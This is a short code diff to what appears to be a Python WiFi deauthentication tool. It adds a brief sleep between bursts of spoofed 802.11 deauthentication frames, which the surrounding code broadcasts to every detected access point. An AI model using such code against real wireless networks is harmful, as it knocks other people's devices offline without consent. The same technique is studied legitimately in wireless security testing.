@@ -46,7 +46,7 @@ class Deauth(object):
                     sys.exit(0)
                 
                 print("[{G}+{N}] {pkt} frames sent to {Y}{bssid}{N}".format(pkt=self.burst, G=GREEN, N=NORMAL, Y=YELLOW, bssid=bssid.upper()))
-
+                sleep(0.2)
 
 class DeauthAll(object):
     def __init__(self, interface):
@@ -101,6 +101,7 @@ class DeauthAll(object):
                 for bssid in self.APs:
                     packet = Dot11(addr1=self.BROADCAST, addr2=bssid, addr3=bssid) / Dot11Deauth()
                     send(packet, count=self.burst)
+                sleep(0.2)
 
                     
 
